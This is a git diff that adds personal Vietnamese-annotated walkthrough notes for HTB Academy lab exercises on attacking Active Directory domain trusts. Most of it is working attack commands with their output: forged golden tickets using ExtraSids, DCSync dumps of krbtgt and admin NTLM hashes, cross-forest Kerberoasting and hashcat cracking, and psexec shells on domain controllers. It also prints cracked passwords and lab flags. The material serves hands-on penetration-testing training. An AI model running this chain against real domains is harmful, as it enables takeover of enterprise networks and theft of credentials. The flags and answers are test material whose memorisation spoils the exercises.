@@ -1408,3 +1408,535 @@ FREIGHTLOGISTICS.LOCAL
 
 + 0  What direction is this trust?
 Bidirectional
+
+
+# Attacking Domain Trusts - Child -> Parent Trusts - from Windows
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): Click here to spawn the target system!  
+
+ RDP to with user "htb-student_adm" and password "HTB_@cademy_stdnt_admin!"
+
++ 0  What is the SID of the child domain?
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainSID
+S-1-5-21-2806153819-209893948-922872689
+PS C:\Tools>
+```
+
++ 0  What is the SID of the Enterprise Admins group in the root domain?
+
+```powershell
+PS C:\Tools> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
+
+objectsid
+---------
+S-1-5-21-3842939050-3880317879-2865463114-519
+```
+
++ 0  Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder on the ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL domain controller in the parent domain.
+
+Tạo golden ticket với Rubeus.exe
+
+```powershell
+PS C:\Tools> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Build TGT
+
+[*] Building PAC
+
+[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
+[*] SID            : S-1-5-21-2806153819-209893948-922872689
+[*] UserId         : 500
+[*] Groups         : 520,512,513,519,518
+[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
+[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+[*] KDCKey         : 9D765B482771505CBE97411065964D5F
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
+[*] Service        : krbtgt
+[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'
+
+[*] AuthTime       : 6/15/2025 10:26:26 PM
+[*] StartTime      : 6/15/2025 10:26:26 PM
+[*] EndTime        : 6/16/2025 8:26:26 AM
+[*] RenewTill      : 6/22/2025 10:26:26 PM
+
+[*] base64(ticket.kirbi):
+    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
+```
+
+Xác nhận vé Kerberos:
+
+```powershell
+PS C:\Tools> klist
+
+Current LogonId is 0:0x536ef
+
+Cached Tickets: (1)
+
+#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
+        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+        Start Time: 6/15/2025 22:26:26 (local)
+        End Time:   6/16/2025 8:26:26 (local)
+        Renew Time: 6/22/2025 22:26:26 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+
+Tiến hành dsync lấy hash của lab_adm
+
+```powershell
+PS C:\Tools> dir \\academy-ea-dc01.inlanefreight.local\c$
+
+
+    Directory: \\academy-ea-dc01.inlanefreight.local\c$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/31/2022  12:34 PM                Department Shares
+d-----         4/7/2022   2:31 PM                ExtraSids
+d-----        9/15/2018  12:19 AM                PerfLogs
+d-r---         4/9/2022   4:59 PM                Program Files
+d-----        9/15/2018   2:06 AM                Program Files (x86)
+d-----        3/31/2022  11:09 AM                User Shares
+d-r---        10/6/2021  10:31 AM                Users
+d-----        4/18/2022  11:37 AM                Windows
+d-----        3/31/2022  11:12 AM                ZZZ_archive
+
+
+PS C:\Tools> type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
+f@ll1ng_l1k3_d0m1no3$
+```
+
+# Attacking Domain Trusts - Child -> Parent Trusts - from Linux
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.186.192 (ACADEMY-EA-ATTACK01) ,10.129.158.98 (ACADEMY-EA-DC02)   
+
+
+ SSH to 10.129.186.192 (ACADEMY-EA-ATTACK01) ,10.129.158.98 (ACADEMY-EA-DC02) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
++ 0  Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer.
+
+Đầu tiên dump hash của krbtgt:
+
+```zsh
+┌─[htb-student@ea-attack01]─[~]
+└──╼ $impacket-secretsdump logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
+krbtgt:des-cbc-md5:fee04c3d026d7538
+[*] Cleaning up... 
+```
+
+Lấy `sid` của domain con:
+
+```zsh
+┌─[htb-student@ea-attack01]─[~]
+└──╼ $impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+Password:
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+```
+
+Lấy `sid` của nhóm `Enterprise Admins`
+
+```zsh
+┌─[htb-student@ea-attack01]─[~]
+└──╼ $impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.5| grep -B12 "Enterprise Admins"
+Password:
+[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
+498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: INLANEFREIGHT\administrator (SidTypeUser)
+501: INLANEFREIGHT\guest (SidTypeUser)
+502: INLANEFREIGHT\krbtgt (SidTypeUser)
+512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
+513: INLANEFREIGHT\Domain Users (SidTypeGroup)
+514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
+515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
+516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
+517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
+518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
+519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
+```
+
+Ta ghép lại được sid đầy đủ: S-1-5-21-3842939050-3880317879-2865463114-519
+
+Tiếp theo tiến hành lấy golden ticket:
+
+```zsh
+┌─[htb-student@ea-attack01]─[~]
+└──╼ $impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncASRepPart
+[*] Saving ticket in hacker.ccache
+```
+
+Thiết lập biến môi trường để sử dụng Golden Ticket:
+
+```zsh
+export KRB5CCNAME=hacker.ccache
+```
+
+Thử lấy shell của inlanefreight.local/dc01
+
+```zsh
+┌─[htb-student@ea-attack01]─[~]
+└──╼ $impacket-psexec LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 172.16.5.5.....
+[*] Found writable share ADMIN$
+[*] Uploading file MRekNDgD.exe
+[*] Opening SVCManager on 172.16.5.5.....
+[*] Creating service QvNo on 172.16.5.5.....
+[*] Starting service QvNo.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+Tiến hành dump hash của `bross`
+
+```zsh
+[htb-student@ea-attack01]─[~]
+└──╼ $impacket-secretsdump -just-dc-ntlm LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 -just-dc-user INLANEFREIGHT/bross        
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
+[*] Cleaning up... 
+```
+
+# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.13.242 (ACADEMY-EA-MS01)   
+
+
+ RDP to 10.129.13.242 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"
+
++ 0  Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.
+
+List tài khoản dịch vụ có Service Principal Names (SPNs) trong AD:
+
+```powershell
+PS C:\Users\htb-student> cd C:\Tools\
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+samaccountname
+--------------
+krbtgt
+mssqlsvc
+sapsso
+```
+
+Tiến hành Kerberoasting:
+
+```powershell
+
+PS C:\Tools> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : mssqlsvc
+[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : mssqlsvc
+[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
+[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
+[*] PwdLastSet             : 3/24/2022 12:47:52 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$25A1BE07FFD84C82392293854A1ABCC5$C53A8D16BEEA246D0537918ED77E18A78402E54ECF7CCD87559333ED0636ADD47414309554B88131E95B15A18F5958EF751D8D554AE84AAB2E5A2FE6C7617DC75361577390AB7D125CF19DDE2041DE234C55938C6E29E5046392EB774583B6FFB8FE61CE832448B0137CA4B51B5A2BF309400A91340557C4D15F4934E31AD1175124670FEE49963916257DF768AE18274C157BE00E90C9EABF5BFEBF307895CAA025596A3F8B2C7C8E098B99C9707C3F7135296C1CCBC6225D5F80843885D6AD57300C44A63EDBDFC1835620311B36C77093D275E1DFCF2AB6E76E66AD053D0D79C289CE8A52FEA0A7BAB1A67E825641BDD4682BDDDBCE1711430274FCF101CFA880BB4988F469890CC0A6A4FB0800082BEF02C39403838A296AC1808386E5ED20DFD2A2DAF6E146AC393D351DE5637D3621B2972131F6CEE810C50E83E50A87091BCEE1D4AA13937D26939225FB54CEAF12DD8C82B2BC839B67229CB17777B5ABE446350C04297BE7C7C7911E9F13B716601C0AD867A5BD54E075A3EE6D41FDE4EF2F7268598683FE05EAD45162407CE02C51A7336FE59ABA6C1CF3331CCF8A94E5F4D10DE633CF678A5F06E66FB5FC2292F153DBF33091B7C7BE0BC9B8408A7A042D57F60C7497006A785448525A428FDCA45B55DFAC4C6285147EE66D62DEC5931EFE01633C3530EEF4E7B0BCFDD9ECEAFF6E9C4FF07EE375486270647DC8D381590E3CF07686C9F66250FC5E6E45B759F108D41E4FE877A911431D11A20410C5E807A77EF08D1A3967B505B7D2700784E4F60EC4B3C98BEEB8DE64B36D99C0113F21BD7B4CA346F012E3E55472F2B28205A9F0C8E4C6FD05BE38C0FB3785E4BD833F80C94B39000F28CBC4BC58FDF53F0CB52E32070400281E3053B60B6C491384C9D165D8D47B935354246A885C1865E7EA42FF87BFB19A55C9D6E84C5C1047ABB9F16D1825CBB34A27D85A6C4F439471DDD6C51E3A72D95AD6F5A919069EB1B87A25282D0A3B5C0EFB562078DE846F228D4C504C9B487A500E98EE7D3F926BB0ACCCEEDB2F4BED92BB12C3B7099CF8B96CA9EB499C0F043D6971C2EA3DA5BDD253216A377B590EC5BDB66CF61C21A15F7B2C62F7C57568EE5480EF8E1245552BE7AF19CD73D07A27CD5938BA8054FFA3E6D4CE79065268786CEC43E4F24C5F0569ABD51B02694E048F97D04B5FB3BCF1C3E847096936C6FBAAA18DF29FF4DC7A7F6EB6FD428829AA2D793744008BD580FBEC7F0F92EACC2311037EAAADD36FAC019D60CDECD32330D20B77E09E52DE167C8F6AAD34D55FD9E4F8DCA398871CCE6820FC2D38499B6E2157B1DC6409D81F31D8BC2BC8E99F148243A14F35FE7839955673719B6233B03E1011B14096B7BD03BEB07269D95738488B285D9106541BAFA2639005DFD8F1742D4B08CD8539D001EA0197C899E35FC9EC19DB45DA930AADA7C0C26D7CF27CE4F96B3704299D6A525785FEB54DBF44067CEB1EA6E25CB834FF95F8806A98F136FF441C297C5FE14BB4D8CE1A854A58A21B1A945371DEACAD3F8A76F31ED1ABE6071A63955753B687CA670F4C51C42A0180E0926C2ABB011F32D8A06FE40E229C9356D7269C5F7B317AEDB48CEBFDCF5E68FC964B111F36484522579CA550CDD28C467FF392369C4AD37341B6C3
+
+PS C:\Tools>
+```
+
+Bẻ khóa mật khẩu với hashcat:
+
+```zsh
+hashcat -m 13100 mssql_hash /usr/share/wordlists/rockyou.txt
+```
+
+# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.180.98 (ACADEMY-EA-ATTACK01)   
+
+ SSH to 10.129.180.98 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
++ 0  Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.
+
+Kiểm tra host và resolv.conf:
+
+```zsh
+┌─[htb-student@ea-attack01]─[~/BloodHound.py]
+└──╼ $cat /etc/hosts
+# Host addresses
+127.0.0.1  localhost
+127.0.1.1  ea-attack01
+::1        localhost ip6-localhost ip6-loopback
+ff02::1    ip6-allnodes
+ff02::2    ip6-allrouter
+172.16.5.5 inlanefreight.local
+172.16.5.5 ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+172.16.5.238 ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
+172.16.5.238 FREIGHTLOGISTICS.LOCAL
+172.16.5.240 LOGISTICS.INLANEFREIGHT.LOCAL
+172.16.5.240 ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
+172.16.5.120 ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
+┌─[htb-student@ea-attack01]─[~/BloodHound.py]
+└──╼ $cat /etc/resolv.conf 
+# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+# 127.0.0.53 is the systemd-resolved stub resolver.
+# run "resolvectl status" to see details about the actual nameservers.
+
+nameserver 1.1.1.1
+nameserver 8.8.8.8
+
+```
+
+
+Thêm vào resolv.conf:
+
+![](images/21.png)
+
+Liệt kê SPNs Account:
+
+```zsh
+┌─[✗]─[htb-student@ea-attack01]─[~/BloodHound.py]
+└──╼ $impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/htb-student
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
+-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
+MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
+HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never> 
+```
+
++ 0  Crack the TGS and submit the cleartext password as your answer.
+
+Request tickets hash:
+
+```zsh
+impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/htb-student -outputfile tickets.hash
+```
+
+Tiến hành crack password:
+
+```zsh
+hashcat -m 13100 tickets.hash /usr/share/wordlists/rockyou.txt
+```
+
+Pass: pabloPICASSO  và 1logistics
+
++ 0  Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.
+
+Tiếp theo chúng ta thu thập thông tin cho bloodhound-ce và phân tích một chút mối quan hệ trust xuyên miền này:
+
+```zsh
+python3 bloodhound.py -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -u htb-student -p 'Academy_student_AD!' -c All
+```
+
+Làm tương tự với FREIGHTLOGISTICS.LOCAL
+
+```zsh
+python3 bloodhound.py -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -u htb-student@inlanefreight.local -p 'Academy_student_AD!' -c All
+```
+
+![](images/22.png)
+
+Nén lại chuyển về VM phân tích với BH:
+
+```zsh
+7z a crossforest.zip 2025*.json
+```
+
+Từ bloodhound, ta sẽ truy vấn Foreign Domain Group membership và đặt source là INLANEFREIGHT.LOCAL. Từ truy vấn ta thấy rằng User Administrator của inlanefreight.local thuộc nhóm admin của freightlogistics.local, do đó người dùng Administrator của domain inlanefreight có thể truy cập vào DOMAIN CONTROLER của FREIGHTLOGISTICS (DC03).
+
+![](images/23.png)
+
+Để xác minh điều này, trước hết ta cần dump hash của Administrator@inlanefreight.local thông qua adunn@inlanefreight.local  mật khẩu `SyncMaster757` hoặc NoPAC mà ta đã lấy ở các phần trước
+
+```zsh
+impacket-secretsdump -just-dc-user INLANEFREIGHT/Administrator INLANEFREIGHT/adunn@172.16.5.5 
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+[*] Kerberos keys grabbed
+inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
+inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
+[*] Cleaning up... 
+```
+
+Thử lấy shell của DC03 và thành công!
+
+```zsh
+impacket-psexec INLANEFREIGHT.LOCAL/Administrator@ACADEMY-EA-DC03 -hashes 'aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf'
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on ACADEMY-EA-DC03.....
+[*] Found writable share ADMIN$
+[*] Uploading file ulwcXTdH.exe
+[*] Opening SVCManager on ACADEMY-EA-DC03.....
+[*] Creating service lFnL on ACADEMY-EA-DC03.....
+[*] Starting service lFnL.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+```
+
+Vậy có lẽ nào hắn có khả năng dump hashes không?
+
+```zsh
+impacket-secretsdump -just-dc-ntlm INLANEFREIGHT/Administrator@ACADEMY-EA-DC03 -hashes 'aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf'
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a3f8446ac62fe83bf9534591a8c3af82:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e1b9b28f7f31d2e116778075c3551f3:::
+lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+FREIGHTLOGISTICS.LOCAL\freight-admin:1107:aad3b435b51404eeaad3b435b51404ee:de6ed16c1c1858826c0d99cd54408c88:::
+FREIGHTLOGISTICS.LOCAL\j-koy:1108:aad3b435b51404eeaad3b435b51404ee:ee84987fe4dc6997abd2655ed5d5c144:::
+FREIGHTLOGISTICS.LOCAL\gdoodler:1114:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+mssqlsvc:1118:aad3b435b51404eeaad3b435b51404ee:19fa7a4aeeb74ebb7b609c2af50be3e9:::
+sapsso:2103:aad3b435b51404eeaad3b435b51404ee:5fb2e69bef7cc4a270666487e0f1cb88:::
+ACADEMY-EA-DC03$:1002:aad3b435b51404eeaad3b435b51404ee:6a011841111644f2cab8ee865267eb13:::
+WIN-PA3E0V9ZGR7$:1110:aad3b435b51404eeaad3b435b51404ee:93cb9a8a1742df1bb100342a9f94f745:::
+WIN-XCM8GBLD6H9$:1112:aad3b435b51404eeaad3b435b51404ee:25bbd2e88685de1a53eef6daac1a3418:::
+WIN-UITHSFM6VDA$:1113:aad3b435b51404eeaad3b435b51404ee:0cc4e6b579e7baf4140bdb88bfad705b:::
+WIN-WGZCO3JEPBM$:1115:aad3b435b51404eeaad3b435b51404ee:3b8c1cac61f6d2a4b1dc4d081454dd1d:::
+INLANEFREIGHT$:1105:aad3b435b51404eeaad3b435b51404ee:25b32911d50d3c1cca6bdc9041f37333:::
+[*] Cleaning up... 
+```
+
+Anh em mình cứ thế thôi hẹ hẹ hẹ.
+
+![](images/24.png)
+
+`sapsso` thuộc Administrators của FREIGHTLOGISTICS, chúng ta cũng đã có mật khẩu của hắn ta, vậy hãy lấy shell của ACADEMY-EA-DC03 và lấy flag.txt
+
+```zsh
+impacket-psexec FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@ACADEMY-EA-DC03
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on ACADEMY-EA-DC03.....
+[*] Found writable share ADMIN$
+[*] Uploading file aqjkiWzn.exe
+[*] Opening SVCManager on ACADEMY-EA-DC03.....
+[*] Creating service iGXo on ACADEMY-EA-DC03.....
+[*] Starting service iGXo.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd c:\users
+ 
+c:\Users>cd Administrator
+ 
+c:\Users\Administrator>cd Desktop
+ 
+c:\Users\Administrator\Desktop>type flag.txt
+burn1ng_d0wn_th3_f0rest!
+```
+
